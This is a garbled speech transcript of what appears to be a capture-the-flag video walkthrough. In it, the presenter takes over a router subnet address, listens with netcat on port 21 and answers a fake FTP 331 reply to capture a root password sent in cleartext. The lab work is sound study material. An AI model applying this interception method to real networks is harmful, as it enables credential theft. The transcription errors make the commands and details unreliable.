the smaller subnet and if we wanted to we'd go back to our box if config and let's just do east to 10 1 2015 10 that mask 255 255 255 0 we could do 128 just so it matches not important and then netcat LVN p21 so now when this guy sends us a packet on port 21 a router is gonna think oh that's a local interface and he's gonna send it to us at least that's what I believe is gonna happen right now let's see if I hit enter does anything happen no so I guess we're just waiting so we got a connection from 1078 10 - and that said user root passive and quit so if we do this again and then every time we hit Enter it is FTP logic but I'm gonna hit enter once and then it should when it connects tell us user root actually I'm not gonna hit em once I'll show this so start this up and then while that's going we'll do FTP raw telnet commands maybe this will do it I want to see like a pact capture so he sends user anonymous so ever since 331 back saying anonymous logins okay client sees 331 and then sends the password so keep that in mind so we got a connection we hit enter it sends a packet back he sends us user root we hit enter to send a packet back again he sends us passive we had enter he just quit and exits so if we just do n CL v n p21 and this time when he says use a root we're gonna say three three one and he'll respond back with this password the other way is just creating a Python program and running an STP server and logging but I find this way a bit cooler so he connected to us hit enter he says use a root we're gonna send this time I pack it back with three three one please subscribe comment and share this video and he's gonna send the password back as bgp telco routing we went back no I don't have Wireshark we could send the rest of it and he'd send everything so we can just copy this and now we got the password so let's see exit one of these boxes there we go here's all the FTP commands he does open user put secret data if we can't secret data I don't know what it is it's just text so probably means nothing so it's by just a file he can put so do contact a shell he is running those commands every minute so hope you guys enjoyed the video take care and I will see you all next week